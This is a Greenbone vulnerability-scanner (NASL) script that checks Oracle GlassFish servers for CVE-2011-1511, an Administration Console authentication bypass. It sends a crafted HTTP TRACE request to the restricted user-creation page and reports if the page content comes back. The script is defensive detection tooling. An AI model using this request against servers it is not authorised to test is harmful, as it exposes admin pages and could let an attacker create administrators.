# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:glassfish_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802411");
  script_version("2024-09-25T05:06:11+0000");
  script_tag(name:"last_modification", value:"2024-09-25 05:06:11 +0000 (Wed, 25 Sep 2024)");
  script_tag(name:"creation_date", value:"2012-01-06 14:03:19 +0530 (Fri, 06 Jan 2012)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2011-1511");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Oracle GlassFish Server Administration Console < 3.1 Authentication Bypass Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_eclipse_glassfish_http_detect.nasl");
  script_mandatory_keys("eclipse/glassfish/http/detected", "GlassFishAdminConsole/port");
  script_require_ports("Services/www", 4848);

  script_tag(name:"summary", value:"Oracle GlassFish Server is prone to a security bypass
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP TRACE request and checks the
  response.");

  script_tag(name:"insight", value:"The flaw is due to an error in Administration Console, when
  handling HTTP requests using the 'TRACE' method. A remote unauthenticated attacker can get access
  to the content of restricted pages in the Administration Console and also an attacker can create
  a new Glassfish administrator.");

  script_tag(name:"impact", value:"Successful exploitation could allow local attackers to access
  sensitive data on the server without being authenticated, by making 'TRACE' requests against the
  Administration Console.");

  script_tag(name:"affected", value:"Oracle GlassFish version 3.0.1 and prior.");

  script_tag(name:"solution", value:"Update to version 3.1 or later.");

  script_xref(name:"URL", value:"http://securityreason.com/securityalert/8254");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47818");
  script_xref(name:"URL", value:"http://www.us-cert.gov/cas/techalerts/TA11-201A.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108381/NGS00106.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

if (!port = get_kb_item("GlassFishAdminConsole/port"))
  exit(0);

url = "/common/security/realms/manageUserNew.jsf?name=admin-realm&configName=server-config&bare=true";

host = http_host_name(port:port);

req = string("TRACE ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n\r\n");

res = http_keepalive_send_recv(port: port, data: req);

if ("ConfirmPassword" >< res && "newPasswordProp:NewPassword" >< res &&
    "405 TRACE method is not allowed" >!< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
